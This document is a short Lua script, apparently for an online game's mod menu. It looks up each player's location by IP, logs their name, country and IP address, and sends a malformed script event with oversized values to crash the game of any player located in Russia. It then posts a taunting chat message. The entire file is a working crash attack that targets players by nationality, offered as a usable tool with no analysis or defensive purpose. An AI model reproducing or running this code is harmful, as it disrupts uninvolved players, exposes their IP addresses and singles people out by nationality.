local function SECrash(ply)
	online.send_script_event(ply, 962740265, 2000000, 2000000, 2000000, 2000000)
end

function on_geoip(ply, ip, country, city, isp, using_vpn)
	local name = online.get_name(ply)
	system.log("GeoIP", "Player " .. name .. " is in " .. country .. " (" .. ip .. ")")
	if country ~= "Russia" then
		return
	end
	system.log("deruZZification", "Crashing " .. name)
	SECrash(ply)
	online.send_chat("I'm russian and I'm coming to russian warship ( nahuy )", false, ply)
end

while true do
	system.yield()
end